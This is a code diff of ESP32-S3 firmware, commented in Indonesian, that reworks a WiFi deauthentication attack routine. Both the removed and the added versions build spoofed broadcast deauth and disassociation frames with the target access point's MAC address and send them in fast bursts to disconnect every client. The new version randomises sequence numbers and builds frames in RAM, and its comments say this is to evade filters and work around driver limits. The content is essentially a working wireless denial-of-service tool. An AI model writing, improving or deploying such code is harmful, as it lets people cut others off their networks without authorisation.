@@ -119,84 +119,55 @@ void loopWiFi(void * pvParameters) {
          
           
            
-    // 1. PINDAH MODE KE AP (Biar lebih sakti kayak GhostESP)
-  else if (isDeauthing && adaTarget) {
-    if (!deauthUdahSetup) {
-        // 1. Matikan WiFi biar bersih
-        esp_wifi_stop();
-        esp_wifi_deinit();
-
-        // 2. Inisialisasi ulang dengan Config Default
-        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-        esp_wifi_init(&cfg);
-        
-        // 3. Set Storage ke RAM (Biar gak ngerusak Flash N16R8 lu)
-        esp_wifi_set_storage(WIFI_STORAGE_RAM);
-
-        // 4. SET MODE AP (Wajib buat ESP32-S3 biar tx lancar)
-        esp_wifi_set_mode(WIFI_MODE_AP);
-        
-        // 5. Setup Config AP Bayangan
-        wifi_config_t ap_config = {};
-        strcpy((char*)ap_config.ap.ssid, "iPhone");
-        ap_config.ap.authmode = WIFI_AUTH_OPEN;
-        ap_config.ap.max_connection = 4;
-        esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-
-        // 6. START & LOCK CHANNEL
-        esp_wifi_start();
-        esp_wifi_set_ps(WIFI_PS_NONE); // MATIIN POWER SAVING!
-        esp_wifi_set_promiscuous(true);
-        
-        // Kasih jeda dikit biar hardware siap
-        vTaskDelay(100 / portTICK_PERIOD_MS);
-        
-        // Paksa channel target
-        esp_err_t err = esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
-        
-        if (err != ESP_OK) {
-            Serial.printf("Error set channel: %s\n", esp_err_to_name(err));
+       else if (isDeauthing && adaTarget) {
+        if (!deauthUdahSetup) {
+            esp_wifi_stop();
+            // Rahasia 1: Set mode ke STA tapi jangan konek mana pun
+            esp_wifi_set_mode(WIFI_MODE_STA); 
+            esp_wifi_start();
+            esp_wifi_set_promiscuous(true);
+            
+            // Rahasia 2: Matikan Power Save TOTAL (Wajib buat S3)
+            esp_wifi_set_ps(WIFI_PS_NONE); 
+            
+            esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+            deauthUdahSetup = true;
         }
 
-        deauthUdahSetup = true;
-        Serial.println("DRIVER FIXED: STRIKE READY!");
+        uint8_t apMac[6];
+        stringToMac(targetTerkunci.mac, apMac);
+        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+        // RAHASIA 3: Pakai Burst Kecil tapi Frekuensi Tinggi
+        for (int b = 0; b < 40; b++) {
+            // Sequence Number harus ngacak total!
+            uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
+            
+            // Build Packet manual di RAM (Biar gak kedetect static filter)
+            uint8_t rawFrame[26];
+            memcpy(rawFrame, deauthFrame, 26);
+            
+            rawFrame[0] = 0xc0; // Deauth
+            memcpy(&rawFrame[4], broadcast, 6);
+            memcpy(&rawFrame[10], apMac, 6);
+            memcpy(&rawFrame[16], apMac, 6);
+            rawFrame[22] = seq & 0xFF;
+            rawFrame[23] = (seq >> 8) & 0xFF;
+            rawFrame[24] = 0x01; // Reason code 1 (Unspecified)
+
+            // INI TRIKNYA: Kirim lewat interface STA (WIFI_IF_STA) 
+            // Kadang driver S3 lebih "longgar" di sini
+            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, false);
+            
+            // Jika masih error 0xC0, kita ganti tipenya jadi Disassoc (0xA0)
+            if (err != ESP_OK) {
+                rawFrame[0] = 0xa0; 
+                esp_wifi_80211_tx(WIFI_IF_STA, rawFrame, 26, false);
+            }
+        }
+        vTaskDelay(1 / portTICK_PERIOD_MS);
     }
 
-
-    uint8_t apMac[6];
-    stringToMac(targetTerkunci.mac, apMac);
-    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-
-    // --- BURST ATTACK (GHOST-ESP STYLE) ---
-    for (int b = 0; b < 30; b++) {
-        // 1. Update Sequence Number (Biar gak kena filter Replay)
-        uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
-        deauthFrame[22] = seq & 0xFF;
-        deauthFrame[23] = (seq >> 8) & 0xFF;
-
-        // 2. Arah 1: AP -> Client (Sebut semua orang harus putus)
-        memcpy(&deauthFrame[4], broadcast, 6);
-        memcpy(&deauthFrame[10], apMac, 6);
-        memcpy(&deauthFrame[16], apMac, 6);
-        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
-
-        // 3. Arah 2: Client -> AP (Nyamar jadi client minta pamit)
-        memcpy(&deauthFrame[4], apMac, 6);
-        memcpy(&deauthFrame[10], broadcast, 6);
-        // Pakai Disassociation (0xA0) buat arah ini
-        uint8_t disas[26];
-        memcpy(disas, deauthFrame, 26);
-        disas[0] = 0xa0; 
-        esp_wifi_80211_tx(WIFI_IF_AP, disas, 26, false);
-        
-        // Delay mikro biar radio nggak choke
-        delayMicroseconds(200);
-    }
-    
-    // Kasih delay kecil di akhir burst biar CPU core lain bisa kerja
-    vTaskDelay(10 / portTICK_PERIOD_MS);
-
-} 
     if (!isSpamming) {
     esp_wifi_set_promiscuous(false);
      spamUdahSetup = false;
